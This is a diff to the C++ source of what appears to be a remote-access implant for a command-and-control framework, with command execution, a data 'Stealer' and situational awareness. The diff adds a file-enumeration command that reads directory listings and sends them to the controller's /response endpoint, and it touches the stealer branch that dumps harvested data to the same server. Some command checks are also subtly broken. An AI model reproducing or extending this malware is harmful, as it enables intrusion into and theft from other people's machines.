@@ -5,6 +5,7 @@
 - Situational Awareness
 - Stealer
 - Execution <arg>
+- File Enumeration <arg> - List files in the directory
 
 
  */
@@ -32,9 +33,9 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
     /* Execution */
     if(command.compare("Execution")){
         printf("Executing Execution\n");
-            /* I have not double-checked this code
-            I grabbed this from our previous patch of code and I'm just
-            grabbing the response*/
+        /* I have not double-checked this code
+        I grabbed this from our previous patch of code and I'm just
+        grabbing the response*/
 
         //split on space
         int i = args.find(" ");
@@ -51,12 +52,32 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
         results = res;
         HttpResponse("/response", implant_id, task_id, results, "success", command);
     }
-            
+    
+    /* File Enumeration */
+    if(command.compare("FileEnum")){
+        printf("Executing File Enumeration\n");
+            //std::string s = std::string("C:\\Windows\\System32");
+        std::string path = args;
+        std::vector<std::string> file_names (getFileNamesFromPath(path));
+
+        std::stringstream storage;
+        for (auto iterator = file_names.begin(); iterator != file_names.end(); iterator++){
+            if (iterator != file_names.begin()){
+                storage << " ";
+            }
+            storage << *iterator;
+        }
+            //std::string s = std::accumulate(ss.begin(), ss.end(), std::string(""));
+        std::string result = storage.str();
+            //std::cout << result << std::endl;
+            //std::string item = 
+        HttpResponse("/response", implant_id, task_id, result, "success", command);
+            //std::cout << item;
+    }
 
     /* Stealer Function */
-    json data_from_driver;
-
     if(command.compare("Stealer") == 0){
+        json data_from_driver;
         printf("Executing Stealer\n");
         data_from_driver = driver();
         results = data_from_driver.dump();
